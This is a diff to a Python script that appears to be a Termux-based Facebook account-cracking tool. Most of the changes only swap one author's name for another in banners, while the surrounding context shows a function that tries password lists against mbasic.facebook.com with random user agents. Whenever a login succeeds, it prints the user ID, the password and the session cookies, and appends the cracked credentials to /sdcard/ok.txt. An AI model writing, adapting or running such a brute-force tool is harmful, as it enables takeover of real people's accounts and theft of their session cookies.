@@ -2,7 +2,7 @@ import os
 print("\033[1;92m [•] GAMING WITH LIMON - SYSTEM INSTALL. . . . \033[1;30m")
 os.system("pkg install espeak")
 print("\033[1;92m   [•] GAMING WITH LIMON - INSTALL COMPLETE \033[1;30m")
-os.system('espeak -a 300 "SAZZAD . TOOLS. install complete"')
+os.system('espeak -a 300 "LIMON . TOOLS. install complete"')
 print("\033[1;92m   [•] UPDATE CHECKING \033[1;30m")
 os.system('espeak -a 300 "WAITING FOR UPDATE"')
 os.system("git pull")
@@ -207,7 +207,7 @@ def rcrack1(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            sys.stdout.write('\r[\033[1;36m[RAKIB KING[🕓]\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] \r'%(loop,tl,len(oks))),
+            sys.stdout.write('\r[\033[1;36m[LIMON VIP[🕓]\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] \r'%(loop,tl,len(oks))),
             sys.stdout.flush()
             free_fb = session.get('https://mbasic.facebook.com').text
             log_data = {
@@ -248,7 +248,7 @@ def rcrack1(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('\033[38;5;46m[𝑅𝐴𝐾𝐼𝐵] '+uid+' | '+ps+' \n\033[38;5;46mCOOKIES [😈] : \033[1;36m'+coki+   '  ')
+                print('\033[38;5;46m[LIMON] '+uid+' | '+ps+' \n\033[38;5;46mCOOKIES [😈] : \033[1;36m'+coki+   '  ')
                 os.system('espeak -a 300 "Congratulations. ok id"')
                 open('/sdcard/ok.txt', 'a').write( uid+' | '+ps+' \n')
                 oks.append(uid)
